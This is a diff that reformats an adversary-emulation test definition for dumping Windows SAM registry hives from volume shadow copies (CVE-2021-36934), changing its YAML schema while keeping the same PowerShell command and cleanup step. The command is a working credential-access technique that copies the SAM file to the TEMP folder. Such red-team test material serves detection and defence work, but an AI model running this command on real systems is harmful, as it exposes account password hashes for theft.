@@ -1,15 +1,16 @@
-- id: 06c7f555-10a8-593d-8ab2-58dc93f89b6b
+- requirements: []
   name: Soumaia ART Tests - dump volume shadow copy hives with System.IO.File
   description: Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
   tactic: credential-access
-  technique:
-    attack_id: T1003.002
-    name: 'OS Credential Dumping: Security Account Manager'
-  platforms:
-    windows:
-      psh:
-        command: "1..10 | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore\n}"
-        cleanup: |-
-          1..10 | % {
-            rm "$env:TEMP\SAMvss$_" -ErrorAction Ignore
-          }
+  technique_id: T1003.002
+  technique_name: 'OS Credential Dumping: Security Account Manager'
+  executors:
+  - cleanup:
+    - 1..10 | % { rm "$env:TEMP\SAMvss$_" -ErrorAction Ignore }
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: 1..10 | % { try { [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM" , "$env:TEMP\SAMvss$_", "true") } catch {}; ls "$env:TEMP\SAMvss$_" -ErrorAction Ignore }
+  id: 06c7f555-10a8-593d-8ab2-58dc93f89b6b
